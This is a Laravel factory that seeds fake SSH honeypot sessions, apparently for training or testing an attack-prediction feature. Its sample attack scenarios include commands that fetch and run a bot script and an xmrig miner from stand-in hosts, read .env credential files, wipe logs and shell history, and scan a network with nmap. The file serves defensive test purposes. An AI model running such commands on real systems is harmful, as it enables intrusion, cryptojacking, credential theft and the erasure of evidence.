<?php

namespace Database\Factories;

use App\Models\HackerSession;
use Illuminate\Database\Eloquent\Factories\Factory;

class HackerSessionFactory extends Factory
{
    protected $model = HackerSession::class;

    public function definition(): array
    {
        $attackScenarios = [
            ['cd /tmp', 'wget http://185.11.22.33/bot.sh', 'chmod 777 bot.sh', './bot.sh'],
            ['whoami', 'curl -O http://evil-server.net/xmrig', 'chmod +x xmrig', './xmrig --cpu-max 100'],
            ['ls -la', 'find / -name ".env" 2>/dev/null', 'cat /var/www/html/.env'],
            ['rm -rf /var/log/syslog', 'history -c', 'echo "" > ~/.bash_history'],
            ['apt-get install nmap -y', 'nmap -sS 192.168.1.0/24', 'ping -c 4 8.8.8.8']
        ];

        return [
            'session_id' => 'ssh_trap_' . $this->faker->unique()->regexify('[A-Za-z0-9]{6}'),
            'ip_address' => $this->faker->ipv4(),
            'username' => $this->faker->randomElement(['root', 'admin', 'ubuntu', 'mysql', 'test']),
            'password' => $this->faker->password(6, 12),
            'commands' => $this->faker->randomElement($attackScenarios),
            'ai_prediction' => null,
            'created_at' => $this->faker->dateTimeBetween('-1 month', 'now'),
            'updated_at' => now(),
        ];
    }
}